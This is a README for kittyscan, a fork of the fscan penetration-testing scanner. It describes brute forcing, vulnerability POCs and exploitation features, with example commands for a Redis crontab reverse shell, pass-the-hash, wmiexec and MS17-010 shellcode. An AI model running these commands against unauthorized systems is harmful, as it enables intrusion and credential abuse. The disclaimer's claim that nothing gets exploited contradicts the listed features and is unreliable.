# kittyscan v1.2
[中文][url-doczh]

> **This project is a fork of [fscan](https://github.com/shadow1ng/fscan) 1.8.4** (MIT License · Copyright (c) 2021 shadow1ng).
> The original copyright and license notice are retained — see [LICENSE.txt](LICENSE.txt).
> All differences from the upstream project are listed in **Section 3: What's new and fixed vs fscan 1.8.4**; per-release details for the v1.0 / v1.1 stage are in [CHANGELOG_v1.0.md](CHANGELOG_v1.0.md).
>
> ⚠️ **Disclaimer**: This tool is intended ONLY for use in environments where you have obtained explicit authorization. Scanning or attacking unauthorized targets is prohibited; any consequences arising from misuse are the sole responsibility of the user.

# 1. Introduction

An intranet comprehensive scanning tool, convenient for one-click automatic and omnidirectional scanning.
It supports host alive detection, port scanning, brute forcing of common services, MS17-010, Redis batch public key writing, scheduled-task reverse shell, reading Windows NIC information, web fingerprinting, web vulnerability scanning, NetBIOS detection and domain controller identification.

On top of fscan 1.8.4, kittyscan keeps improving in three directions:

- **Wider coverage**: 24 → 41 service plugins, 386 → 688 POCs, 21 → 143 default ports, expanded dictionaries and brute-force services;
- **More accurate detection**: fingerprint rules and POC false positives tightened against nuclei templates (3 dead rules revived, high-FP POCs removed); detection details fixed across the board (response-header key case, GBK encoding, timeouts);
- **More stable**: fixed database brute-force hangs (no IO timeout), RDP brute-force deadlock, 727 concurrency DATA RACEs and Redis RESP parsing corruption — verified with `-race`, real-world environments and a target machine.

# 2. Functions

1. Information collection:

* Alive detection (ICMP / `-ping`)
* Port scanning (`-syn` half-open scan available, requires admin/root)
* Pipeline scheduling: discovered ports immediately trigger WebTitle and service brute force in parallel

2. Brute force:

* Service brute force: SSH, SMB, RDP, **WinRM**, FTP, Telnet, VNC, SVN, LDAP, Elasticsearch, Tomcat, WebLogic, ActiveMQ, RabbitMQ, Kafka, Zookeeper, Rsync, SNMP, etc.
* Database brute force: MySQL, MSSQL, PostgreSQL, Oracle, Redis, MongoDB, etc.
* `-br N` per-host brute threads (effective for **all** brute modules, default 1 = serial)

3. System information & vulnerability scanning:

* NetBIOS detection, domain controller identification
* Collect NIC information
* High-risk vulnerability scanning (MS17-010, etc.)

4. Web detection:

* WebTitle detection
* Web fingerprinting (common CMS, OA frameworks, etc.)
* **Fingerprint-only modes**: `-m finger` (port scan first, then fingerprints), `-m fingeronly` (skip port scan, probe web ports directly)
* Web vulnerability scanning (WebLogic, Struts2, etc., xray-format POCs supported); DnsLog blind detection is **enabled by default** (`-nodns` disables it, `-ceye-key` / `-ceye-domain` override credentials)

5. Exploit:

* Write Redis public key / crontab reverse shell
* Execute SSH commands
* MS17017 exploitation (shellcode), e.g. adding users

6. Output & others:

* Tagged colored output: `[port]` / `[web]` / `[info]` / `[vul]`; a hit POC prints the full request, the matched expression and a response snippet
* `-json` NDJSON result output, `-silent`, `-nocolor`
* Graceful Ctrl+C shutdown (stop dispatching → flush in-flight results → print completion stats)
* Random scan delay (enabled by default, `-nodelay` disables), `-tls` min TLS version, `-maxconns` max connections per host, rotation of 7 recent User-Agents

# 3. What's new and fixed vs fscan 1.8.4

## 3.1 Scale comparison

| Item | fscan 1.8.4 | kittyscan v1.2 |
|---|---|---|
| Service plugins (`Plugins/*.go`) | 24 | **41** |
| POCs (`WebScan/pocs/*.yml`) | 386 | **688** |
| Default scan ports | 21 | **143** |
| Go source lines | ~7,700 | **~14,200** |

Default behavior differences:

| Item | fscan 1.8.4 | kittyscan v1.2 |
|---|---|---|
| Default threads `-t` | 600 | 100 (stealthier) |
| Default output file `-o` | `result.txt` | `output.txt` |
| DnsLog blind detection | off by default (`-dns` enables) | **on by default** (`-nodns` disables) |
| Scan delay | none | random delay enabled (`-nodelay` disables) |
| Proxy flags | `-proxy` + `-socks5` | unified `-proxy` (scope by scheme, see 3.2) |
| Help | none | `-help` (Chinese) / `-hen` (English), both with examples |

## 3.2 New features

### New service plugins (24 → 41)

> None of the plugins below exist in upstream fscan 1.8.4. They extend coverage so that common high-value middleware, databases, storage and remote-management services are checked for **unauthorized access and weak credentials**.

| Plugin (port) | Function | Why it was added |
| --- | --- | --- |
| Elasticsearch (9200) | Unauthorized access check + Basic Auth brute force | Cloud-native / log stores are frequently left open |
| Tomcat (8080) | Manager Basic Auth brute force | Very common Java middleware weak passwords |
| WebLogic (7001) | Console form-login brute force | High-value Chinese Java middleware |
| ActiveMQ (8161/61616) | Unauthorized check + console brute force | Message-queue exposure and weak passwords |
| VNC (5900) | RFB protocol DES-encrypted brute force | Remote desktop weak passwords |
| SVN (3690) | HTTP OPTIONS probe + Basic Auth brute force | Source-code disclosure entry point |
| LDAP (389/5000/636) | Native LDAP Bind brute force | Credential spraying in domain environments |
| Zookeeper (2181) | `ruok` four-letter command / unauthorized check | Distributed-coordination exposure |
| Kafka (9092) | Metadata request unauthorized check | Message-queue exposure |
| RabbitMQ (15672) | HTTP API `/api/overview` unauthorized check | Management console exposure |
| Rsync (873) | Protocol handshake, module listing and brute force | Backup / source-code leakage |
| Telnet (23) | TCP connect + brute force | Weak passwords on plaintext protocols |
| SNMP (161/UDP) | UDP GET sysDescr, community brute force | Network-device information leakage |
| RTSP (554) | Streaming protocol probe and brute force | Camera / streaming weak passwords |
| WinRM (5985/5986) | WS-Man + full NTLM Type1/2/3 brute force | Windows remote-management weak passwords (canary-guarded against false positives) |

### Other new capabilities

* **Fingerprint-only modes**: `-m finger` / `-m fingeronly` (fingerprints only, no POC, no brute force)
* **SYN half-open scanning**: `-syn` (raw sockets on Linux root, otherwise automatically falls back to TCP connect)
* **Chinese / English help**: `-help` / `-hen`, every flag comes with examples
* **Overridable blind-scan credentials**: `-ceye-key` / `-ceye-domain`
* **Unified `-proxy` entry**:
  * `-proxy http://...` → HTTP (Web/POC) egress only; port scanning and brute-force TCP traffic stays direct;
  * `-proxy socks5://...` → global proxy; all TCP dials and web/POC requests go through it (ICMP probing is skipped automatically);
  * also accepts `host:port`, bare port, `-proxy 1` (Burp) and `-proxy 2` (SOCKS5) shortcuts; **the former `-socks5` flag was merged into this flag — rewrite old scripts as `-proxy socks5://...`**
* **Output enhancement**: tagged colored output; hit POCs print the full request, match expression and response snippet
* **Ports / dictionaries / POCs**: default ports 21 → 143; password dictionary 70 → 100+ (year variants, keyboard sequences, service defaults) plus account dictionaries for 9 new services; POCs 386 → 688 (Spring Actuator, VMware, Nacos, Chinese OA/CMS, ...), high-FP POCs vetted at intake (11 that only checked `status=200` dropped)
* **Time-based blind SQLi support**: POC rule `response.duration >= seconds`
* **POC field extensions**: `response.raw_header` (raw response headers) and `output` variable extraction, so POCs can match more precisely and pull values into follow-up requests
* **POC rule short-circuit fields**: `stop_if_match` (stop on match and count the group as hit, the OR-style "found it, wrap up") / `stop_if_mismatch` (stop on mismatch, same as the default sequential-AND behavior), semantics aligned with afrog/xray
* **POC bases support a path prefix**: when the original URL carries a subdirectory, both the root and that directory are scanned — `-u http://h/app/dev/api/login.html` hits `http://h/` **and** `http://h/app/dev/api/` (this part is unaffected by `-no302base`)
* **Redirect-derived POC bases** (enabled by default, disable with `-no302base`): on top of the two bases above, a same-host jump into a subdirectory adds that directory prefix (e.g. `http://host/dev/`), a jump to a root-level file adds nothing; a cross-host jump adds the new host's root only (its path depth ignored)
* **Graceful Ctrl+C**: stop dispatching → flush in-flight results (8s guard) → print completion stats → exit code 130
* **Engineering**: `build.py` one-shot multi-platform build (optional UPX, skipped automatically when not installed)

## 3.3 Fixes and improvements vs fscan 1.8.4

> The table below is a consolidated list measured against upstream 1.8.4 (implementation details of the new plugins are out of scope here — see 3.2 for their function and purpose).

| Category | Fixes and improvements |
| --- | --- |
| Stability | Postgres/MySQL/MSSQL had no IO timeout → brute force **hung forever** on unresponsive targets (blackhole measured 30s+ hang → clean 2.2s exit); RDP brute force deadlocked on success (`brlist` made buffered so both paths finish); DATA RACEs on the RDP connection path → `-race` re-tests back to zero (727 before the fix); CIDR `/7`~`/0` expanded without limit causing OOM → cap of 65536 with an explicit message, target skipped |
| Missed detections & scope | Mismatched response-header key case raised `no such key`, permanently breaking ~30 POCs (incl. the upstream `alibaba-nacos` POC) → written under both canonical and lowercase keys; cross-host 302 sent POCs to an external domain while missing the original target → bases computed explicitly (see 3.2); `-hn` ignored `ip:port` targets from `-hf` (**authorization boundary**) → filtering moved to the `ParseIP` source; `-pa` broke port convergence; ICMP one-to-many mapping reported only one alive host for `localhost` + `127.0.0.1`; GBK pages missed Chinese fingerprints (upstream decoded after fingerprint injection) → decoding moved before injection; `-br` only honored for RDP upstream → extended to every brute module (~3.6x speedup); `-nobr` no longer implicitly skips vulnerability detection |
| False-positive control | Systematic fcgi false positives corrected; 5 fingerprint rules tightened (nuclei-template based) and 3 dead rules revived; Redis `-rf`/`-rs` skipped config recovery on errors → could overwrite the target's real public key, recovery now deferred over every return path |
| Output & interaction | `-silent` had only 1 honoring site upstream → now converged across 17 sites (status lines and load summaries silenced too); `-json` output guaranteed to be valid NDJSON; invalid parameters and targets now fail loudly instead of silently; `os.Stdout` flushing (upstream output lagged on Windows cmd); `-rf`/`-sshkey`/`-pocpath` accept BOM / UTF-16 encoded files; brute timeouts tiered (SSH 1s / others 2s) |

## 3.4 Verification

* Every batch passed **dual-platform builds (Windows + `GOOS=linux`)** with clean `gofmt` / `go vet`
* `-race` (CGO + GCC): RDP-path races **re-tested at 0 across 5 rounds** after the fix
* Real-world verification: item-by-item checks against public assets and a Kali range (protocol-level comparisons)
* Target-machine tests: RDP / WinRM correct-password and concurrency on a Windows target (correct password prints `[vul]`, wrong password gives no false positives); full Redis matrix on Kali (public key / crontab written, target config restored)
* Local fake-range regression: POC bases, proxy scoping, rule short-circuit fields and redirect bases verified case by case

## 3.5 Known limitations

* With `-br N>1`, plugins that report `[vul]` inside a connection may print duplicates when several workers succeed; **use `-br 1` for Redis**
* The WinRM canary leaves one failed login of a non-existent account in the target's security log (the cost of a false-positive-proof design)
* `-noredis` only skips the write action; unauthorized detection and brute force still run

# 4. Instructions

Getting started:

```
kittyscan.exe -h 192.168.1.1/24   (all modules by default)
kittyscan.exe -h 192.168.1.1/16
```

Advanced:

```
kittyscan.exe -h 192.168.1.1/24 -np -no -nopoc   (skip alive detection, no output file, skip web poc)
kittyscan.exe -h 192.168.1.1/24 -rf id_rsa.pub   (Redis write public key)
kittyscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (Redis crontab reverse shell)
kittyscan.exe -h 192.168.1.1/24 -c whoami        (execute ssh command after brute success)
kittyscan.exe -h 192.168.1.1/24 -m ssh -p 2222   (module + port)
kittyscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (load username/password files)
kittyscan.exe -h 192.168.1.1/24 -o /tmp/1.txt    (output path, current dir by default)
kittyscan.exe -h 192.168.1.1/8                   (gateway + a few random IPs of each /24)
kittyscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb password spray)
kittyscan.exe -h 192.168.1.1/24 -m ms17010       (module)
kittyscan.exe -hf ip.txt                          (import targets from file)
kittyscan.exe -u http://baidu.com -proxy 8080     (single url + http proxy http://127.0.0.1:8080)
kittyscan.exe -h 192.168.1.1/24 -proxy socks5://127.0.0.1:1080 (global proxy: every TCP dial and web/poc request)
kittyscan.exe -h 192.168.1.1/24 -nobr -nopoc     (no brute force, no web poc, less traffic)
kittyscan.exe -h 192.168.1.1/24 -pa 3389         (add 3389->rdp scan to defaults)
kittyscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (built-in shellcode, dedicated tools recommended)
kittyscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash collision, xxxx:ntlmhash)
kittyscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec)
kittyscan.exe -m finger -h 192.168.1.1/24 -p 80,443,8080 (fingerprints only: port scan then web fingerprints)
kittyscan.exe -m fingeronly -h 192.168.1.1       (fingerprints only: skip port scan)
kittyscan.exe -u http://192.168.1.1:8080 -m finger (single URL fingerprint)
kittyscan.exe -h 192.168.1.1/24 -syn             (SYN scan, requires admin/root)
kittyscan.exe -h 192.168.1.1/24 -br 8            (per-host brute threads, all brute modules)
kittyscan.exe -h 192.168.1.0/24 -nodns           (disable DnsLog blind detection)
```

Compile:

```powershell
# Windows
go build -ldflags="-s -w" -trimpath -o kittyscan.exe main.go

# Cross-compile for Linux (note: _linux files are excluded from Windows builds,
# so cross-compilation is the only way to catch errors in them)
$env:GOOS="linux"; $env:GOARCH="amd64"; go build -trimpath -o kittyscan main.go

# One-shot multi-platform build (UPX compression optional, skipped if upx is absent)
python build.py
```

Full parameters (same as running `kittyscan.exe -help`; English version via `-hen`):

```
--------------------------------------
Usage: kittyscan.exe [options]
       (-hen shows this English help, -help shows Chinese help)

Target:
  -h  string   Target IP/domain/CIDR
                e.g.: -h 192.168.1.1
                e.g.: -h 192.168.1.0/24
                e.g.: -h 192.168.1.1,192.168.1.2
  -hn string   Exclude hosts from scan
                e.g.: -hn 192.168.1.1/24
  -hf string   Host file for batch scan
                e.g.: -hf ip.txt

Live Check:
  -np          Skip alive detection, scan ports directly
  -ping        Use ping instead of ICMP for alive detection

Ports:
  -p  string   Ports to scan (default: 143 common ports)
                e.g.: -p 22
                e.g.: -p 1-65535
                e.g.: -p 22,80,3306
  -pa string   Add ports to defaults
                e.g.: -pa 3389
  -pn string   Exclude ports
                e.g.: -pn 445
  -portf string  Port file
                e.g.: -portf ports.txt

Scan Type:
  -m  string   Scan type (default: all)
                e.g.: -m all / -m ssh / -m redis / -m web
                e.g.: -m finger (fingerprint only, no poc/brute)
                e.g.: -m fingeronly (same, skip port scan)
                e.g.: -m portscan / -m icmp / -m ms17010

Web Scan:
  -u  string   Direct URL
                e.g.: -u http://192.168.1.1:8080
  -uf string   URL file
                e.g.: -uf urls.txt
  -pocname string  Filter POCs by name
                e.g.: -pocname weblogic
  -pocpath string  Custom POC directory
                e.g.: -pocpath /path/to/pocs
  -full        Full POC scan
  -dns         DnsLog blind detection (default: enabled)
  -nodns       Disable DnsLog detection
  -no302base   Disable redirect-derived extra POC bases (default: enabled)
                Always scanned: original root + the original URL's own directory (.../app/dev/api/login.html -> http://h/ and http://h/app/dev/api/)
                When enabled also adds: same-host jump subdir prefix + cross-host new root (disabled = only the two above)
  -ceye-key string  Override ceye API key for reverse connection (empty = built-in default)
                e.g.: -ceye-key 0123456789abcdef0123456789abcdef
  -ceye-domain string  Override ceye subdomain for reverse connection (empty = built-in default)
                e.g.: -ceye-domain abc.ceye.io
  -nopoc       Skip web vuln scan (ports/service detection only)
  -cookie string  Set cookie
                e.g.: -cookie rememberMe=login
  -proxy string   Set proxy (scope depends on scheme; former -socks5 merged into this flag)
                http://   -> HTTP(Web/POC) egress only; port scan/brute TCP traffic stays direct
                socks5:// -> global proxy; all TCP dials (ports/services/brute) and web/poc requests go through it (ICMP probe auto-disabled)
                e.g.: -proxy http://127.0.0.1:8080
                e.g.: -proxy socks5://127.0.0.1:1080
                e.g.: -proxy 127.0.0.1:8080    (default HTTP)
                e.g.: -proxy 8080              (default 127.0.0.1)
                e.g.: -proxy 1                 (Burp default, http only)
                e.g.: -proxy 2                 (SOCKS5 default, global)
  -num int     POC concurrency (default: 20)
                e.g.: -num 50

Brute Force:
  -user string   Username
                e.g.: -user admin
  -pwd  string   Password
                e.g.: -pwd 123456
  -userf string  Username file
                e.g.: -userf user.txt
  -pwdf string   Password file
                e.g.: -pwdf pass.txt
  -usera string  Add usernames to defaults
                e.g.: -usera testuser
  -pwda string   Add passwords to defaults
                e.g.: -pwda P@ssw0rt1
  -nobr        Skip brute force (vuln detection still runs)

Special:
  -c  string   SSH/WmiExec command
                e.g.: -c whoami
  -sshkey string  SSH key file
                e.g.: -sshkey id_rsa
  -domain string  SMB domain
                e.g.: -domain WORKGROUP
  -sc  string   MS17-010 shellcode
                e.g.: -sc add
  -hash string   SMB NTLM Hash
                e.g.: -hash aad3b435b51404eeaad3b435b51404ee
  -rf  string   Redis write SSH pubkey
                e.g.: -rf id_rsa.pub
  -rs  string   Redis write crontab reverse shell
                e.g.: -rs 192.168.1.1:6666
  -path string  Fcgi/SMB remote file path
                e.g.: -path /www/wwwroot/index.php
  -noredis     Skip redis unauthorized test
  -wmi         Try WMI exec when port 135 is found
  -syn         SYN scan (requires admin/root)

Performance:
  -t  int       Threads (default: 100)
                e.g.: -t 500
  -time int     Timeout seconds (default: 3)
                e.g.: -time 5
  -wt  int      Web timeout seconds (default: 5)
                e.g.: -wt 10
  -br  int      Per-host brute threads (default: 1 = serial, effective for all brute modules)
                e.g.: -br 5
  -num int      POC concurrency (default: 20)
                e.g.: -num 50
  -tls int      TLS min version (default: 10)
                e.g.: -tls 12   (more secure)
                e.g.: -tls 13   (latest)
  -maxconns int Max connections per host (default: 10)
                e.g.: -maxconns 20
  -nodelay     Disable random scan delay (enabled by default)
                Web delay 100-300ms, Brute delay 50-100ms

Output:
  -o  string    Output file (default: output.txt)
                e.g.: -o output.txt
  -no           Do not save to file
  -json         JSON format output
  -silent       Silent mode
  -nocolor      Disable colored output
  -top int      Show live hosts TOP count (default: 10)
                e.g.: -top 20
  -debug int    Progress log interval (default: 60)
                e.g.: -debug 30

Examples:
  kittyscan.exe -h 192.168.1.0/24
  kittyscan.exe -h 192.168.1.1 -m ssh -t 100
  kittyscan.exe -hf ip.txt -p 22,3306,6379
  kittyscan.exe -u http://192.168.1.1:8080 -pocname struts2
  kittyscan.exe -h 192.168.1.0/24 -m ssh -user admin -pwdf pass.txt
  kittyscan.exe -h 192.168.1.0/24 -nodns         Disable DnsLog
```

# 5. Demo

Build script screenshot
![](image/1.png)

Alive detection screenshot
![](image/2.png)

Vulnerability scan screenshot
![](image/3.png)

# 6. Disclaimer

This tool is only for **legally authorized** enterprise security construction activities. If you need to test the usability of this tool, please build a target machine environment by yourself.

In order to avoid being used maliciously, all pocs included in this project are theoretical judgments of vulnerabilities, there is no process of exploiting vulnerabilities, and no real attacks and exploits will be launched on the target.

When using this tool for detection, you should ensure that the behavior complies with local laws and regulations, and you have obtained sufficient authorization. **Do not scan unauthorized targets**.

If you have any illegal acts during the use of this tool, you shall bear the corresponding consequences by yourself, and we will not bear any legal and joint liability.

Before installing and using this tool, please **be sure to carefully read and fully understand the content of each clause**. Restrictions, exemption clauses or other clauses involving your major rights and interests may remind you to pay attention in the form of bold, underline, etc.
Unless you have fully read, fully understood and accepted all the terms of this agreement, please do not install and use this tool. Your use behavior or your acceptance of this agreement in any other express or implied way shall be deemed to have read and agreed to be bound by this agreement.

[url-doczh]: README.md
